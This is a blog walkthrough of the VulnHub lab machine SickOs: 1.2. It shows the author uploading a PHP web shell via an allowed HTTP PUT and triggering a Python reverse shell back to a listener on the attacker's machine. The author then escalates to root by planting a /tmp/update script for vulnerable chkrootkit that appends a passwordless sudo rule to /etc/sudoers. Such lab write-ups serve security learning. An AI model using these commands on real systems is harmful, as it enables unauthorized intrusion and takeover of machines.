# VulnHub - SickOs: 1.2 (In Detail)

_6 min read · February 12, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**SickOs: 1.2**](https://www.vulnhub.com/entry/sickos-12,144/) machine from [**VulnHub**](https://www.vulnhub.com/about/).

- Goal: Obtain `7d03aaa2bf93d80040f3f22ec6ad9d5a.txt` in Root
- Difficulty: Easy
- Machine Author: D4rk

---

## Getting the Machine IP Address

As usual:

```bash
sudo netdiscover -i eth0 -r 192.168.11.0/24
```

In my case, the machine IP address is **192.168.11.140**.

## Scanning for Open Ports

Again as usual:

```bash
nmap -sS 192.168.11.140
sudo nmap -sCV -p 22,80 192.168.11.140
```

![Nmap Output](./img/vulnhub-sickos1.2/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open.
- HTTP is running on lighttpd 1.4.28.

I then browsed the site.

![SickOs 1.2: Website](./img/vulnhub-sickos1.2/web.png)

I also inspected the source code, but there was nothing useful there.

---

## Further Enumeration on the Website

I continued the enumeration using [**Gobuster**](https://www.kali.org/tools/gobuster/).

```bash
gobuster dir -u http://192.168.11.140 -w /usr/share/wordlists/dirb/common.txt
```

- dir → Enumerate directories.
- -w → Wordlist.

![Gobuster Output](./img/vulnhub-sickos1.2/Gobuster-output.png)

From the result, I found the `/test` directory. I then accessed the `/test` directory.

![SickOs 1.2: Website Test](./img/vulnhub-sickos1.2/web-test.png)

I still didn't find anything useful here.

Next, I checked which HTTP methods were allowed on this directory using [**curl**](https://www.kali.org/tools/curl/).

```bash
curl -v -X OPTIONS http://192.168.11.140/test
```

- -X OPTIONS → Sends an HTTP OPTIONS request to check allowed methods.

![Curl Output](./img/vulnhub-sickos1.2/curl-output.png)

The response showed that `PUT` is allowed. This can be used to upload files.

---

## Gaining the Machine Shell

I uploaded a simple PHP web shell using curl.

```bash
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.11.140/test/shell.php
```

- -d → Data to be written into `shell.php`.
- system() → PHP function that executes a given command in the operating system shell and outputs the result directly to the web page.
- $\_GET["c"] → PHP superglobal variable that collects the value of a URL parameter named 'c' sent via the HTTP GET method.

After uploading, I tested it in the browser.

```bash
http://192.168.11.140/test/shell.php?c=whoami
```

![Simple PHP Shell Output](./img/vulnhub-sickos1.2/shell.png)

Since it worked, I then set up a Python reverse shell using this [cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Start listener:

```bash
nc -lvp 443
```

Then trigger reverse shell:

```bash
curl "http://192.168.11.140/test/shell.php?c=python+-c+%27import+socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22192.168.11.138%22%2c443))%3bos.dup2(s.fileno()%2c0)%3b+os.dup2(s.fileno()%2c1)%3b+os.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d)%3b%27"
```

Note: I tried different ports before but they didn't work. It might be because this machine has firewall configured.

After getting the shell, I made it interactive TTY.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![Reverse Shell Output](./img/vulnhub-sickos1.2/rev-shell.png)

---

## Post-Exploitation Enumeration

After gaining the reverse shell, I performed my usual post-exploitation checklist:

- Checked `sudo` permissions
- Looked for SUID binaries
- Checked writable directories
- Looked for interesting files

But I didn’t find anything useful at first. I was stuck for quite some time.

After doing some research, I discovered that privilege escalation could be done via [Cron jobs](https://chocapikk.com/posts/2023/elevation_privileges_unix_crontab/).

```bash
cd /etc
cat crontab
```

![Crontab Output](./img/vulnhub-sickos1.2/crontab.png)

The crontab showed that scripts inside `/etc/cron.daily` are executed as root.

So I enumerated all cron-related directories.

```bash
ls | grep cron
cd cron.daily
ls
```

Inside `cron.daily`, I found `chkrootkit`.

Then I checked its version:

```bash
chkrootkit -V
```

![Cron Enum](./img/vulnhub-sickos1.2/cron-enum.png)

The version was 0.49.

According to [Exploit-DB](https://www.exploit-db.com/exploits/38775), `chkrootkit` versions < 0.50 are vulnerable. It executes a file name `/tmp/update/` if it exists. Since `/tmp` is world-writable, any user can create that file. Because cron runs `chkrootkit` as root, the `/tmp/update` file will also be executed as root.

---

## Privilege Escalation

Then I created malicious `/tmp/update` file.

```bash
cd /tmp
echo "chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers" > update
chmod +x update
```

- Makes `/etc/sudoers` writable
- Adds `www-data` with full sudo privileges without password
- Restores correct sudoers permissions

After some time, I switched to root and retrieved the flag.

```bash
sudo su
cd /root
ls
cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
```

![Flag](./img/vulnhub-sickos1.2/flag.png)

Bomba! Settleee.

---

## Session Terminated

SickOs: 1.2 is an easy machine that focuses heavily on web enumeration, HTTP method abuse, and privilege escalation through vulnerable scheduled tasks. From this machine, I learned how to:

- identify dangerous HTTP methods such as `PUT`
- upload a malicious PHP web shell via misconfigured web server
- gain remote command execution through `system()`
- establish a reverse shell using Python
- understand how `run-parts` works in cron.daily
- exploit insecure execution of `/tmp/update` for privilege escalation
- escalate privileges by abusing world-writable directories like `/tmp`

Overall, this lab reinforced the importance of proper post-exploitation enumeration. Even when sudo permissions and SUID binaries look clean, scheduled tasks and outdated software can still lead to full root compromise. Thank you for reading and see you next time!
